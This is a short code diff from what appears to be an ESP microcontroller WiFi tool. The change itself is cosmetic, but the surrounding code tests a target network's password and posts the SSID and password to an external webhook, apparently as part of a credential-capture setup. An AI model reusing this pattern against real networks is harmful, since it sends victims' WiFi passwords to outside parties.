@@ -106,12 +106,10 @@ void validate(const String &targetSSID, const String &pass){
   int time = millis(); int i = 0;
   while (WiFi.status() != 3 && WiFi.status() != 4 && millis() - time < 10 * 1000){ delay(250); i++; } //wait until the wifi is conected, the wrong password status is set or the timeout triggered
   esp.printf("wifiStatus|%i", WiFi.status()); //send the wifi code to the master
-  esp.printf("It took %i seconds\n", i/4);
+  esp.printf("It took %i seconds\n\n", i/4);
 }
 
 void sendWebhook(const String url, const String ssid, const String pass) {
-  esp.printf("=====WebHook=====\n");
-
   WiFiClientSecure *client = new WiFiClientSecure; HTTPClient https;
   int httpCode = 255;
 
@@ -123,7 +121,7 @@ void sendWebhook(const String url, const String ssid, const String pass) {
 
       while (httpCode != 200){ //send post request until http code is 200
         httpCode = https.POST("{'ssid':'" + ssid + "','pass':" + pass + "}"); //send post request
-        esp.printf("Webhook HTTP code %i\n", httpCode);
+        esp.printf("Webhook HTTP code %i\n\n", httpCode);
         delay(500);
       }
       
@@ -131,7 +129,6 @@ void sendWebhook(const String url, const String ssid, const String pass) {
     }
   }
   delete client; //delete pointer to client
-  esp.printf("=====WebHook=====\n\n");
 }
 
 void setup() {
